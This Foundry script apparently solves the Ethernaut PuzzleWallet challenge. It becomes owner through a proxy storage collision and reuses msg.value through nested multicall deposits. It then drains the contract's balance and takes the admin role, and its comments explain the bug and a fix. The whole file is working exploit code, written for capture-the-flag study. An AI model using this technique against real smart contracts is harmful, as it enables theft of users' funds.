pragma solidity ^0.8.0;


import "forge-std/Script.sol";

contract PuzzleWalletScript is Script {
    bytes[] public s;
    bytes[] public a;
    function run() external returns (bytes memory){
        vm.startBroadcast();
        address instance = 0xb708d936f2D4E1FF0b363cFfbAED2Db9EacD238f;

        a.push(abi.encodeWithSignature("deposit()"));
        s.push(abi.encodeWithSignature("deposit()"));
        s.push(abi.encodeWithSignature("multicall(bytes[])", a));

        console.log("Contract balance before exploit : ");
        console.log(instance.balance);



        //automation
        //set pendingadmin as msg.sender
        (bool suc, bytes memory data) = instance.call(abi.encodeWithSignature("proposeNewAdmin(address)",address(msg.sender)));
        require(suc, "1 failed");
        (suc,  data) = instance.call(abi.encodeWithSignature("owner()", msg.sender));
        console.log(vm.toString(address(uint160(bytes20(data)))));

        //addToWhitelist msg.sender
        (suc, ) = instance.call(abi.encodeWithSignature("addToWhitelist(address)",msg.sender));
        require(suc, "2 failed");
        //multicall with one deposit and nested multicall with deposit
        (suc, ) = instance.call{value: 0.001 * 10**18}(abi.encodeWithSignature("multicall(bytes[])", s));
        require(suc, "3 failed");

        (suc,  data) = instance.call(abi.encodeWithSignature("balances(address)", msg.sender));
        console.log(vm.toString((data)));
        // ^
        // |
        // this will set depositCalled to false again as it's a fresh call to multicall, therefore 
        // being able to abuse delegatecall: maintaing msg.value even after being used once.
        //how to prevent this? in this case, you could make depositCalled a storage variable
        // and set it to true when called and set it back to false at the end of the call after the for-loop
        //now, this poc would not work if i would've set s and a as memory instead of storage
        //since evm interprets the storage array and memory array differently, thus, the encoding results
        //are different between the two.

        bytes memory sigarg = abi.encodePacked(uint256(0x636578));
        //drain instanec
        (suc, data) = instance.call(abi.encodeWithSignature("execute(address,uint256,bytes)", msg.sender, instance.balance, sigarg));
        require(suc, "4 failed");
        //change admin since instance.balance == 0;
        (suc, ) = instance.call(abi.encodeWithSignature("setMaxBalance(uint256)", uint256(uint160(msg.sender))));
        require(suc, "5 failed");


        console.log("Contract balance after exploit : ");
        console.log(instance.balance);
    }
}